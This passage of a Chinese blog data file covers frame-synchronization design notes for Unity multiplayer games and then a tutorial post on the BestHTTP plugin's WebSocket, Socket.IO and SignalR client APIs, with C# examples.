1),每帧随机数计算都由服务器下发种子来控制.</li>\n<li>4:帧同步伤害算法.</li>\n</ul>\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><ul>\n<li>1:大多数情况下网络是波动的,接收/发送的数据频率是不稳定的.客户端需要等到逻辑帧返回才可以进行下一步.</li>\n<li>2:做一个逻辑帧缓冲区,设置上限,当存入缓存区的帧数据满足上限之后,按照固定频率播放.出现延迟,则填入逻辑帧缓冲区,然后平均分布到固定的频率中去,平滑处理网络波动造成的卡顿</li>\n<li>3:丢帧,采用 UDP(KCP) 进行传输.关键帧里面携带前 2 帧的数据,大大降低帧数据丢失率,同时需要削减包的大小.每个包不要超过 576 byte(一个MTU以下).</li>\n<li>4:实测情况下,最坏可能要 24kb/s 的速度,这个速度很难稳定达到</li>\n</ul>\n<h2 id=\"渲染层\"><a href=\"#渲染层\" class=\"headerlink\" title=\"渲染层\"></a>渲染层</h2><ul>\n<li>1:加速功能,Time.timeScale = 2/1.5/1/0.5;等.计算时需要根据机子性能进行加速调整,因为CPU就是那压力过大,会出现卡顿和跳帧</li>\n<li>2:战斗回放功能,因为关键帧记录,以及关键帧计算的结果都是一致的,所以最后将关键帧数据回放并计算就是正确的回放</li>\n</ul>\n<h2 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h2><ul>\n<li>1:服务器只处理逻辑,这就要客户端需要将逻辑与渲染分开,客户端采用线程处理逻辑部分,主线程处理渲染部分.</li>\n<li>2:同一份代码如果都是用 C#写的话,需要区分客户端还是服务器代码使用宏定义可以很好的区别</li>\n<li>3:c#核心代码的编写需要另开一个库进行,版本容易管理,需要将 Log/Time/存储 等类进行重写以适配客户端和服务器</li>\n<li>4:</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"帧同步\"><a href=\"#帧同步\" class=\"headerlink\" title=\"帧同步\"></a>帧同步</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li>1:逻辑在客户端实现,服务器主要负责广播和验证操作,逻辑直观,数据量小,可重播</li>\n<li>2:客户端上传操作,服务器收集,固定频率广播收到的数据,不在乎客户端是否上传成功,不影响其他客户端的表现.</li>\n<li>3:最重要的概念: <strong><em>相同输入，经过相同计算过程，得出相同计算结果</em></strong> ,运行结果不与硬件运行速度快慢相关联.需要注意的是,不能使用 unity3d 自带的系统 API,例如Time类/Invoke函数/脚本的方法/物理引擎/协程,因为会造成不同步.需要自己开线程使用固定的时间片段进帧数据操作,逻辑帧执行的次数是恒定的.</li>\n<li>4:需求以及要求:高一致性,低流量消耗,多人实时性,战斗回放功能,加速功能,服务器同步逻辑校验防作弊,服务器逻辑简化,弱网络环境,</li>\n<li>5:逻辑帧固定为0.033(即 1 秒 30 逻辑帧),渲染帧设定为60(update 里面最大可以1s 跑 60 次),如果CPU 运行不过来,update 执行次数会降低.卡顿以及丢帧:是因为逻辑帧跑了很多帧之后,渲染帧才执行了一帧.</li>\n<li>6:<a href=\"https://blog.csdn.net/qq_18536721/article/details/52713564\" target=\"_blank\" rel=\"noopener\">核心文章1</a> <a href=\"https://blog.csdn.net/game_jqd/article/details/72870289\" target=\"_blank\" rel=\"noopener\">核心文章2</a></li>\n</ul>\n<h2 id=\"帧数据\"><a href=\"#帧数据\" class=\"headerlink\" title=\"帧数据\"></a>帧数据</h2><ul>\n<li>1:关键帧.服务器按固定频率广播的操作数据帧，使用唯一ID标识，主要包括客户端输入数据或服务器发送的关键信息(例如游戏战斗开始或结束等消息),网络数据.</li>\n<li>2:填充帧.由于设备性能和网络延迟等原因,服务器广播频率不可能达到客户端的更新频率,若只使用关键帧来驱动游戏运作，就会造成游戏卡顿，影响体验.因此，除关键帧外，客户端需要自行添加若干空数据帧，以使游戏表现更为流畅.网络数据或者本地伪造数据.</li>\n<li>3:逻辑帧:客户端执行一帧所需时间，可根据设备性能和网络环境等因素动态变化.</li>\n<li>4:服务器帧更新时间：服务器广播帧数据的固定频率，一般用于帧间隔时间差的逻辑计算(一般情况下 0.033(即 1 秒 30 逻辑帧) 足够)</li>\n</ul>\n<h2 id=\"插件选择与使用方式\"><a href=\"#插件选择与使用方式\" class=\"headerlink\" title=\"插件选择与使用方式\"></a>插件选择与使用方式</h2><ul>\n<li>1:定点数和浮点数，是指在计算机中一个数的小数点的位置是固定的还是浮动的,如果一个数中小数点的位置是固定的，则为定点数；如果一个数中小数点的位置是浮动的，则为浮点数。定点数由于小数点的位置固定,因此其精度可控,相反浮点数的精度不可控.</li>\n<li>2:unity 自带的 float/Vector2/Vector3/Vector4都不要使用,要使用框架Fix定点数来替换使用</li>\n<li>3:关于需要使用核心动画的,都不能使用Dotween插件做动画,因为Dotween插件使用的是Time.deltaTime做插值的,不是使用逻辑时长做插值的,因为在不重要的地方做动画是可以的.</li>\n<li>随机数,随机数种子最好由服务器发送,然后随机数选择一个库来使用,保证每个客户端的随机数相同</li>\n</ul>\n<h2 id=\"数据计算\"><a href=\"#数据计算\" class=\"headerlink\" title=\"数据计算\"></a>数据计算</h2><ul>\n<li>1:需要计算的顺序必须保持一致,unity的update不可控,需要自己开线程定时 0.033s/f (即 1 秒 30 逻辑帧)计算,保证顺序一致,</li>\n<li>2:需要明确各个客户端计算结果都必须一致才正确,如果计算不正确就是bug.凡是遇到计算全部转成定点数进行计算,并且由服务器发送随机数种子.</li>\n<li>3:帧时间:当前帧序列数*服务器帧更新时间/(填充帧数 + 1),每帧随机数计算都由服务器下发种子来控制.</li>\n<li>4:帧同步伤害算法.</li>\n</ul>\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><ul>\n<li>1:大多数情况下网络是波动的,接收/发送的数据频率是不稳定的.客户端需要等到逻辑帧返回才可以进行下一步.</li>\n<li>2:做一个逻辑帧缓冲区,设置上限,当存入缓存区的帧数据满足上限之后,按照固定频率播放.出现延迟,则填入逻辑帧缓冲区,然后平均分布到固定的频率中去,平滑处理网络波动造成的卡顿</li>\n<li>3:丢帧,采用 UDP(KCP) 进行传输.关键帧里面携带前 2 帧的数据,大大降低帧数据丢失率,同时需要削减包的大小.每个包不要超过 576 byte(一个MTU以下).</li>\n<li>4:实测情况下,最坏可能要 24kb/s 的速度,这个速度很难稳定达到</li>\n</ul>\n<h2 id=\"渲染层\"><a href=\"#渲染层\" class=\"headerlink\" title=\"渲染层\"></a>渲染层</h2><ul>\n<li>1:加速功能,Time.timeScale = 2/1.5/1/0.5;等.计算时需要根据机子性能进行加速调整,因为CPU就是那压力过大,会出现卡顿和跳帧</li>\n<li>2:战斗回放功能,因为关键帧记录,以及关键帧计算的结果都是一致的,所以最后将关键帧数据回放并计算就是正确的回放</li>\n</ul>\n<h2 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h2><ul>\n<li>1:服务器只处理逻辑,这就要客户端需要将逻辑与渲染分开,客户端采用线程处理逻辑部分,主线程处理渲染部分.</li>\n<li>2:同一份代码如果都是用 C#写的话,需要区分客户端还是服务器代码使用宏定义可以很好的区别</li>\n<li>3:c#核心代码的编写需要另开一个库进行,版本容易管理,需要将 Log/Time/存储 等类进行重写以适配客户端和服务器</li>\n<li>4:</li>\n</ul>\n"},{"title":"BestHttp介绍2","date":"2020-05-11T03:41:32.000Z","_content":"\n# WebSocket\n\n## 介绍\n* 1:我们可以通过WebSocket类使用WebSocket功能。我们只需要将服务器的Uri传递给WebSocket的构造函数\n\n* 2:创建\n\n\n```\n        var webSocket = new WebSocket(new Uri(\"wss://html5labs-interop.cloudapp.net/echo\")); \n\n```\n* 3:,OnOpen事件：在建立与服务器的连接时调用。在此事件回调之后，WebSocket的IsOpen属性将为True，直到我们或服务器关闭连接或发生错误。\n\n```\n        webSocket.OnOpen += OnWebSocketOpen; \n        private void OnWebSocketOpen(WebSocket webSocket) { Debug.Log(\"WebSocket Open!\"); }\n```\n\n\n* 4:,OnMessage事件：从服务器收到文本消息时调用。\n\n```\n        webSocket.OnMessage += OnMessageReceived; \n        private void OnMessageReceived(WebSocket webSocket, string message) { Debug.Log(\"Text Message received from server: \" + message); } \n\n```\n\n\n* 5:,OnBinary事件：从服务器收到二进制blob消息时调用。\n\n\n```\n        webSocket.OnBinary += OnBinaryMessageReceived; \n        private void OnBinaryMessageReceived(WebSocket webSocket, byte[] message) { Debug.Log(\"Binary Message received from server. Length: \" + message.Length); }\n\n```\n\n\n* 6:,OnClosed事件：在客户端或服务器关闭连接时调用，或发生内部错误。当客户端通过Close函数关闭连接时，它可以提供代码和消息，指示关闭的原因。服务器通常会回复我们的代码和消息。\n\n\n```\n        webSocket.OnClosed += OnWebSocketClosed; \n        private void OnWebSocketClosed(WebSocket webSocket, UInt16 code, string message) { Debug.Log(\"WebSocket Closed!\");}\n\n```\n\n\n* 7:OnError事件：当我们无法连接到服务器时调用，发生内部错误或连接丢失。第二个参数是Exception对象，但它可以为null。在这种情况下，检查WebSocket的InternalRequest应该告诉更多有关该问题的信息。\n\n\n```\n        webSocket.OnError += OnError; \n        private void OnError(WebSocket ws, Exception ex) \n        { \n                string errorMsg = string .Empty; \n                if (ws.InternalRequest.Response != null)\n                {\n                        errorMsg = string.Format(\"Status Code from Server: {0} and Message: {1}\", ws.InternalRequest.Response.StatusCode, ws.InternalRequest.Response.Message); \n                }\n                Debug.Log(\"An error occured: \" + (ex != null ? ex.Message : \"Unknown: \" + errorMsg)); \n        } \n\n```\n\n\n* 8:OnErrorDesc事件：一个更具信息性的事件，此事件在OnError事件之后调用,因为后者仅使用Exception参数调用。但它可以提供更详细的错误报告。\n\n\n```\n        webSocket.OnErrorDesc += OnErrorDesc; \n        void OnErrorDesc(WebSocket ws, string error) { Debug.Log(\"Error: \" + error); } \n\n```\n\n\n* 9:在我们将所有事件注册完备之后，我们可以开始连接：\n\n```\n        webSocket.Open(); \n\n```\n\n\n在此步骤之后，我们将收到一个OnOpen事件的回调，我们可以开始向服务器发送消息。\n\n\n```\n        // 发送字符串: \n        webSocket.Send(\"Message to the Server\"); \n\n        // 创建二进制流,并填充: \n        byte[] buffer = new byte[length]; \n        //发送二进制流 \n        webSocket.Send(buffer); \n\n```\n\n完成通信后/不需要的时候,关闭链接,无法重用已关闭的WebSocket实例。\n\n```\n        webSocket.Close(); \n\n```\n* 10:Ping消息：通过在收到OnOpen事件之前将StartPingThread属性设置为True，可以启动新线程将Ping消息发送到服务器。这样，Ping消息将定期发送到服务器。可以在PingFrequency属性中设置两次ping之间的延迟（默认值为1000ms）.(相当于设置心跳包)\n* 11:Pong消息：从插件服务器收到的所有ping消息将自动生成Pong应答。\n* 12:Streaming：较长的文本或二进制消息将变得支离破碎。默认情况下，这些片段由插件自动组装。如果我们向WebSocket的OnIncompleteFrame事件注册事件处理程序，则可以覆盖此机制。每次客户端收到不完整的片段时都会调用此事件。这些片段将被插件忽略，它不会尝试组装这些片段，也不会存储它们。此事件可用于实现流式传输体验。(自定义组装消息).\n\n## 使用Socket.IO\n* 1:Socket.IO实现使用插件已有的功能。当轮询传输与其所有功能（cookie，连接重用等）一起使用时，它将发送HTTPRequests以获取握手数据，发送和接收数据包。 WebSocket实现用于WebSocket传输\n>>>\n        1):易于使用和熟悉的api\n        2):兼容最新的Socket.IO规范\n        3):从轮询传输到websocket传输的无缝升级\n        4):断开时自动重新连接\n        5):简单高效的二进制数据发送和多种接收方式\n        6):在高级模式下使用它的强大工具（切换默认编码器，禁用自动解码等）\n>>>\n* 2:使用.如果要连接到Socket.IO服务，可以使用BestHTTP.SocketIO.SocketManager类来完成。首先，您必须创建一个SocketManager实例\n\n```\n        using System; using BestHTTP; \n        using BestHTTP.SocketIO; \n        var manager = new SocketManager(new Uri(\"http://chat.socket.io/socket.io/\")); \n```\n\n* 3:Url中的/socket.io/路径非常重要，默认情况下，Socket.IO服务器将侦听此查询。所以不要忘记测试！\n* 4:Connecting to namespaces ,默认情况下，SocketManager将在连接到服务器时连接到根（“/”）命名空间。您可以通过SocketManager的Socket属性访问它：\n\n```\n        Socket root = manager.Socket; \n```\n\n可以通过GetSocket（'/ nspName'）函数或通过manager的indexer属性访问非默认名称空间：\n\n```\n        Socket nsp = manager[\"/customNamespace\"]; \n        // 等价于: \n        Socket nsp = manager.GetSocket(\"/customNamespace\"); \n```\n\n\n首次访问命名空间将启动内部连接过程\n* 4:Subscribing  and receiving events ,您可以订阅预定义和自定义事件。预定义事件是“连接”，“连接”，“事件”，“断开连接”，“重新连接”，“重新连接”，“重新连接”，“重新连接失败”，“错误”。(\"connect\", \"connecting\", \"event\", \"disconnect\", \"reconnect\", \"reconnecting\", \"reconnect_attempt\", \"reconnect_failed\", \"error\". )自定义事件是程序员定义的事件，服务器将发送给您的客户端。您可以通过调用套接字的On函数来订阅事件：\n```\n        manager.Socket.On(\"login\", OnLogin); \n        manager.Socket.On(\"new message\", OnNewMessage); \n\n        void OnLogin(Socket socket, Packet packet, params object[] args) \n        { \n                //Socket参数将是服务器发送此事件的namespace-socket对象\n                //Packet参数包含事件的内部分组数据。数据包可用于访问服务器发送的二进制数据，或使用自定义Json解析器lib解码有效负载数据。稍后会详细介绍。\n                //Args参数是一个可变长度数组，包含来自数据包有效负载数据的解码对象。使用默认的Json编码器，这些参数可以是“原始”类型（int，double，string）或对象列表（List对象）或Dictionary字符串，对象对象。\n        } \n\n```\n```\n        //服务器上面的代码写法,在一个 node.js 的服务器上面\n        socket.emit('message', ‘MyNick’, ‘Msg to the client’); \n        //客户端接收\n        // subscribe to the \"message\" event \n        manager.Socket.On(\"message\", OnMessage); \n        // event handler \n        void OnMessage(Socket socket, Packet packet, params object[] args) \n        { \n                // args[0] is the nick of the sender \n                // args[1] is the message \n                Debug.Log(string.Format(\"Message from {0}: {1}\", args[0], args[1])); \n        } \n\n```\n>>>\n        ●“connect”：命名空间打开时发送。 \n        ●“connecting”：当SocketManager开始连接到socket.io服务器时发送。 \n        ●“event”：在自定义（程序员定义的）事件上发送。 \n        ●“disconnect”：当传输断开，SocketManager关闭，Socket关闭或在握手数据中指定的给定时间内没有从服务器收到Pong消息时发送。 \n        ●“reconnect”：插件成功重新连接到socket.io服务器时发送。 \n        ●“reconnecting”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_attempt”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_failed”：重新连接尝试无法连接到服务器并且ReconnectAttempt达到选项“ReconnectionAttempts”值时发送。 \n        ●“error”：在服务器或内部插件错误上发送。事件的唯一参数是BestHTTP.SocketIO.Error对象。\n        ● Once：您可以订阅仅被调用一次的事件。manager.Socket.Once(\"connect\", OnConnected); \n        ● Off:您可以删除所有活动订阅，或只删除一个\n        // 删除所有的回调事件\n        manager.Socket.Off(); \n        //从\"connect\"事件中删除所有回调\n        manager.Socket.Off(\"connect\"); \n        //从\"connect\"事件中删除OnConnected回调\n        manager.Socket.Off(\"connect\", OnConnected); \n>>>\n\n* 5:Sending events ,您可以使用“Emit”功能发送事件。您必须将事件名称作为第一个参数和可选的其他参数传递。这些将被编码为json并将被发送到服务器。您可以选择设置一个回调函数，该函数将在服务器处理事件时被调用（您必须正确设置服务器代码才能发回回调函数。有关更多信息，请参阅Socket.IO服务器端文档）。\n```\n        // 发送携带 2 个参数的事件给服务器\n        manager.Socket.Emit(\"message\", \"userName\", \"message\"); \n\n        // 发送携带 2 个参数的并有回调事件的事件给服务器\n        manager.Socket.Emit(\"custom event\", OnAckCallback, \"param 1\", \"param 2\"); \n        void OnAckCallback(Socket socket, Packet originalPacket, params object[] args) { Debug.Log(\"OnAckCallback!\"); } \n```\n您可以通过调用套接字的EmitAck函数向服务器发回确认。您必须传递原始数据包和任何可选数据,您可以保留对数据包的引用，并从其他位置调用EmitAck:\n```\n        manager[\"/customNamespace\"].On(\"customEvent\", (socket, packet, args) => { socket.EmitAck(packet, \"Event\", \"Received\", \"Successfully\"); }); \n```\n* 6:发送二进制数据有 2 种方法\n1):通过传递给Emit函数，插件将扫描参数，如果找到参数，它将把它转换为二进制附件（如Socket.IO 1.0中所介绍的）。这是最有效的方法，因为它不会将字节数组转换为客户端的Base64编码字符串，并在服务器端转换为二进制。\n```\n        byte[] data = new byte[10]; \n        manager.Socket.Emit(\"eventWithBinary\", \"textual param\", data); \n```\n2):如果二进制数据作为字段或属性嵌入对象中，则Json编码器必须支持转换。默认的Json编码器无法将嵌入的二进制数据转换为Json，您必须使用更高级的Json解析器库（如'JSON .NET For Unity' - http://u3d.as/5q2）\n* 7:接收二进制数据\n在Socket.IO服务器中，当二进制数据发送到客户端时，它将用Json对象（{'_ placeholder'：true，'num'：xyz}）替换数据，并将二进制数据发送到另一个数据包中。在客户端，这些数据包将被收集并合并到一个数据包中。二进制数据将位于数据包的Attachments属性中。\n1):在这里你也可以选择使用这个数据包：\n在事件处理程序中，您可以通过数据包的Attachments属性访问所有二进制数据,autoDecodePayload默认为 true\n```\n        Socket.On(\"frame\", OnFrame); \n        void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); }\n```\n2):第二个选项与前一个选项几乎相同，略有改进：我们不会将发送的Json字符串解码为c＃对象。我们可以这样做，因为我们知道服务器只发送了二进制数据，此事件没有其他信息。因此，我们将让插件知道不解码有效负载\n```\n        //订阅“frame”事件，并将autoDecodePayload标志设置为false,不让插件自动解码\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); } \n\n```\n3):我们可以将'{'_placeholder'：true，'num'：xyz}'字符串替换为附件列表中附件的索引。\n```\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) \n        { \n                //用索引替换Json对象\n                packet.ReconstructAttachmentAsIndex(); \n                // 现在，将Payload解码为 object[]\n                args = packet.Decode(socket.Manager.Encoder); \n                // args现在只包含一个索引号（可能为0） \n                byte[] data = packet.Attachments[Convert.ToInt32(args[0])]; texture.LoadImage(data); \n        } \n```\n4):我们可以用附件中转换为Base64编码字符串的二进制数据替换'{'_ placeholder'：true，'num'：xyz}'字符串。当高级Json解析器必须将其设置为对象的字段或属性时，它可以将其转换为字节数组\n```\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) \n        { \n                // 用Base64编码的字符串替换Json对象 packet.ReconstructAttachmentAsBase64(); \n                // 现在，将Payload解码为object[]\n                args = packet.Decode(socket.Manager.Encoder); \n                // args现在包含一个Base64编码的字符串\n                byte[] data = Convert.FromBase64String(args[0] as string); texture.LoadImage(data); \n        }\n```\n* 8:设置默认的Json编码器, 您可以通过将SocketManager的静态DefaultEncoder设置为新的编码器来更改默认的Json编码器。在此步骤之后，所有新创建的SocketManager将使用此编码器。或者，您可以直接将SocketManager对象的Encoder属性设置为编码器。\n编写自定义Json编码器:如果由于各种原因想要更改默认的Json编码器，首先必须编写一个新的Json编码器。为此，您必须编写一个新类，该类从BestHTTP.SocketIO.JsonEncoders命名空间实现IJsonEncoder。剥离的IJsonEncoder非常小，你必须只实现两个功能：\n```\n        public interface IJsonEncoder \n        { \n                List<object> Decode(string json); \n                string Encode(List<object> obj); \n        } \n```\nDecode函数必须将给定的json字符串解码为对象列表。由于Socket.IO协议的性质，发送的json是一个数组，第一个元素是事件的名称。Encode函数用于编码客户端要发送给服务器的数据。此列表的结构与Decode相同：列表的第一个元素是事件的名称，任何其他元素是用户发送的参数。例子:\n```\n        using LitJson; \n        public sealed class LitJsonEncoder : IJsonEncoder \n        { \n                public List<object> Decode(string json) \n                { \n                        JsonReader reader = new JsonReader(json); \n                        return JsonMapper.ToObject<List<object>>(reader); \n                } \n                public string Encode(List<object> obj) \n                { \n                        JsonWriter writer = new JsonWriter(); \n                        JsonMapper.ToJson(obj, writer); \n                        return writer.ToString(); \n                } \n        } \n```\n\n* 9:AutoDecodePayload属性,\n已经在“接收二进制数据”中讨论过AutoDecodePayload，但是您不仅可以按event设置此值，还可以设置每个socket的值。socket具有AutoDecodePayload属性，该属性用作事件订阅的默认值。其默认值为true - 所有Payload都已解码并分派给事件订阅者。如果设置为false，插件将不进行解码，您必须自己完成。\n你不想每次都抛出args：当然！您可以在Socket对象上设置AutoDecodePayload，并且可以使用您喜欢的Json解析器将Packet的Payload解码为强类型对象。但请记住，Payload将包含事件的名称，它是一个json数组。示例Payload如下所示：'['eventName'，{'field'：'stringValue'}，{'field'：1.0}]'。\n\n* 10:Error handling  发生服务器端或客户端错误时发出“错误”事件。事件的第一个参数是Error对象。这将包含Code属性中的错误代码和Message属性中的字符串消息。此类中的ToString（）函数已被重写，您可以使用此函数写出其内容。\n```\n        Socket.On(SocketIOEventTypes.Error, OnError); \n        void OnError(Socket socket, Packet packet, params object[] args) \n        { \n                Error error = args[0] as Error; \n                switch (error.Code) \n                { \n                        case SocketIOErrors.User: \n                                Debug.Log(\"Exception in an event handler!\"); \n                        break; \n                        case SocketIOErrors.Internal: \n                                Debug.Log(\"Internal error!\"); \n                        break; \n                        default: \n                                Debug.Log(\"Server error!\"); break; \n                } \n                Debug.Log(error.ToString()); \n        } \n```\n\n* 11:SocketOptions类中的可用选项,您可以将SocketOptions实例传递给SocketManager的构造函数。您可以更改以下选项：\n>>>\n        1):Reconnection：断开连接后是否自动重新连接。其默认值为true\n        2):ReconnectionAttempts：放弃前的尝试次数。它的默认值是Int.MaxValu\n        3):ReconnectionDelay：在尝试重新连接之前最初等待的时间。受+/- RandomizationFactor影响。例如，默认初始延迟将在500ms到1500ms之间。其默认值为10000毫秒。\n        4):ReconnectionDelayMax：重新连接之间等待的最长时间。如上所述，每次尝试都会增加重新连接延迟以及随机化。其默认值为5000毫秒。\n        5):RandomizationFactor：它可用于控制ReconnectionDelay范围。其默认值为0.5，可以在0..1值之间设置\n        6)Timeout:发出“connect_error”和“connect_timeout”事件之前的连接超时。它不是底层tcp套接字的连接超时，而是socket.io协议。其默认值为20000ms\n        7):AutoConnect：通过将此设置为false，您必须在决定适当时调用SocketManager的Open（）。\n        8):ConnectWith：So​​cketManager将尝试连接到此属性的传输集。它可以是TransportTypes.Polling或TransportTypes.WebSocket\n>>>\n\n# SignalR\n* 1:像Socket.IO这样的SignalR实现使用了插件的基本功能。 HTTPRequests和WebSockets用于连接和通信连接池。 Cookie随请求一起发送，记录器用于记录有关协议和错误的信息,SignalR实现的功能简要列表：\n>>>\n        1):兼容最新的SignalR服务器实现\n        2):好用的 API\n        3):传输回调\n        4):重新连接逻辑\n        5):支持所有Hub功能\n>>>\n```\n        using BestHTTP.SignalR;\n        Uri uri = new Uri(\"http://besthttpsignalr.azurewebsites.net/raw-connection/\");\n        //通过仅将服务器的uri传递给构造函数来创建没有集线器的连接。\n        Connection signalRConnection = new Connection(uri); \n        //通过将集线器名称传递给构造函数来创建与集线器的连接。\n        Connection signalRConnection = new Connection(uri, \"hub1\", \"hub2\", \"hubN\"); \n        //通过将Hub对象传递给构造函数来创建与Hub的连接。\n        Hub hub1 = new Hub(\"hub1\"); \n        Hub hub2 = new Hub(\"hub2\"); \n        Hub hubN = new Hub(\"hubN\"); \n        Connection signalRConnection = new Connection(uri, hub1, hub2, hubN); \n        //创建Connection之后，我们可以通过调用Open（）函数开始连接到服务器\n        signalRConnection.Open(); \n```\n* 2:Handling general events Connection类允许您订阅多个事件。这些事件如下：\n```\n        //OnConnected：当连接类成功连接并且SignalR协议用于通信时，将触发此事件。\n        signalRConnection.OnConnected += (con) => Debug.Log(\"Connected to the SignalR server!\"); \n\n        //OnClosed：当SignalR协议关闭时，将触发此事件，并且不再发送或接收更多消息。\n        signalRConnection.OnClosed += (con) => Debug.Log(\"Connection Closed\"); \n        //OnError：发生错误时调用。如果连接已打开，插件将尝试重新连接，否则连接将关闭。\n        signalRConnection.OnError += (conn, err) => Debug.Log(\"Error: \" + err); \n\n        //OnReconnecting：启动重新连接尝试时会触发此事件。在此事件之后，将调用OnError或OnReconnected事件。可以在OnReconnected / OnClosed事件之前触发多个OnReconnecting-OnError事件对，因为插件将尝试在给定时间内多次重新连接。\n        signalRConnection.OnReconnecting += (con) => Debug.Log(\"Reconnecting\"); \n\n        //OnReconnected：重新连接尝试成功时触发。\n        signalRConnection.OnReconnecting += (con) => Debug.Log(\"Reconnected\"); \n        //OnStateChnaged：连接状态发生变化时触发。事件处理程序将同时接收旧状态和新状态。\n        signalRConnection.OnStateChanged += (conn, oldState, newState) => Debug.Log(string.Format(\"State Changed {0} -> {1}\", oldState, newState)); \n\n        //OnNonHubMessage：当服务器向客户端发送非集线器消息时触发。客户端应该知道服务器期望的消息类型，并且应该相应地转换接收的对象。\n        signalRConnection.OnNonHubMessage + =（con，data）= Debug.Log（'来自服务器的消息：'+ data.ToString（））;\n\n        //RequestPreparator：为每个发出并将发送到服务器的HTTPRequest调用此委托。它可用于进一步自定义请求。\n        signalRConnection.RequestPreparator = (con, req, type) => req.Timeout = TimeSpan.FromSeconds(30); \n\n```\n\n* 3:Sending non-Hub  messages \n```\n        //将非集线器消息发送到服务器很容易，因为调用连接对象上的函数：\n        signalRConnection.Send(new { Type = \"Broadcast\", Value = \"Hello SignalR World!\" }); \n\n        //此函数将使用Connection的JsonEncoder将给定对象编码为Json字符串，并将其发送到服务器。已编码的Json字符串可以使用SendJson函数发送\n        signalRConnection.SendJson(\"{ Type: ‘Broadcast’, Value: ‘Hello SignalR World!’ }\"); \n```\n\n* 4:Hubs,为了在客户端上定义Hub可以从服务器调用的方法，并调用a上的方法\n服务器上的集线器必须将集线器添加到Connection对象。这可以通过将集线器名称或集线器实例添加到Connection构造函数来完成，在“连接类”部分中进行了演示\n```\n        //可以通过索引或名称通过Connection对象访问Hub实例。\n        Hub hub = signalRConnection[0]; \n        Hub hub = signalRConnection[\"hubName\"]; \n\n        // 注册服务器可调用方法,要处理服务器可调用方法调用，我们必须调用集线器的On函数：\n        signalRConnection[\"hubName\"].On(\"joined\", Joined); \n        void Joined(Hub hub, MethodCallMessage msg) { Debug.log(string.Format(\"{0} joined at {1}\", msg.Arguments[0], msg.Arguments[1])); }\n```\nMethodCallMessage是服务器发送的对象，包含以下属性：\n>>>\n        Hub：包含方法必须调用的集线器名称的字符串。\n        Method：包含方法名称的字符串\n        Arguments：包含方法调用参数的对象数组。它可以是一个空数组。\n        State：包含其他自定义数据的字典\n>>>\n该插件将使用Hub和Method属性将消息路由到正确的集线器和事件处理程序。处理方法调用的函数只能使用Arguments和State属性。\n\n* 5:Call server-side methods \n调用服务器端方法可以通过调用Hub的Call函数来完成。调用函数重载以满足每个需求。 Call函数是非阻塞函数，它们不会阻塞，直到服务器发回有关该调用的任何消息。\n* 6:重载函数:\nCall（string method，params object [] args）：这可以用来以一种即发即弃的方式调用服务器端函数。我们不会收到有关方法调用成功或失败的任何消息。可以在没有任何'args'参数的情况下调用此函数来调用无参数方法\n```\n        //在没有任何参数的情况下调用服务器端函数\n        signalRConnection[\"hubName\"].Call(\"Ping\"); \n        //使用两个字符串参数调用服务器端函数：'param1'和'param2'\n        signalRConnection[\"hubName\"].Call(\"Message\", \"param1\", \"param2\"); \n```\nCall（string method ，OnMethodResultDelegate onResult，params object [] args）：此函数可以用作前一个函数，但是函数可以作为第二个参数传递，该参数将在成功调用服务器端函数时调用。\n```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone); \n        void OnGetValueDone(Hub hub, ClientMessage originalMessage, ResultMessage result) { Debug.Log(\"GetValue executed on the server. Return value of the function:\" + result.ReturnValue.ToString()); } \n```\n此回调函数接收调用此函数的Hub，发送到服务器的原始ClientMessage消息以及由于方法调用而由服务器发送的ResultMessage实例。 ResultMessage对象包含ReturnValue和State属性。               \n如果方法的返回类型为void，则ReturnValue为null.\nCall（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，params object [] args）：此函数可用于指定当方法无法在服务器上运行时将调用的回调。由于方法调用中存在未找到的方法，错误的参数或未处理的异常，因此可能会发生故障\n```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone, OnGetValueFailed); \n        void OnGetValueFailed(Hub hub, ClientMessage originalMessage, FailureMessage error) \n        { \n                Debug.Log(\"GetValue failed. Error message from the server: \" + error.ErrorMessage); \n        } \n```\n FailureMessage包含以下属性：\n >>>\n        ○ IsHubError：如果是Hub错误，则为True。 \n        ○ ErrorMessage：有关错误本身的简短消息。 \n        ○ StackTrace：如果在服务器上打开了详细的错误报告，则它包含错误的堆栈跟踪。\n        ○ AdditionalData：如果它不为null，则它包含有关错误的其他信息。\n >>>\n Call（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，OnMethodProgressDelegate onProgress，params object [] args）：此函数可用于向服务器端方法调用添加其他进度消息处理程序。对于长时间运行的作业，服务器可以将进度消息发送到客户端。\n ```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone, OnGetValueFailed, OnGetValueProgress); \n        void OnGetValueProgress(Hub hub, ClientMessage originalMessage, ProgressMessage progress) \n        { \n                Debug.Log(string.Format(\"GetValue progressed: {0}%\", progress.Progress)); \n        }\n ```\n 当插件收到ResultMessage或FailureMessage时，它不会为这些消息之后的ProgressMessages提供服务。\n\n * 7:使用Hub类作为继承的基类,Hub类可以用作封装集线器功能的基类。\n ```\n        class SampleHub : Hub \n        { \n                // 默认构造函数。每个集线器都必须有一个有效的名称. \n                public SampleHub() :base(\"SampleHub\") \n                { \n                        // 注册服务器可调用函数 \n                        base.On(\"ClientFunction\", ClientFunctionImplementation); \n                }\n                // 私有函数实现服务器可调用函数\n                private void 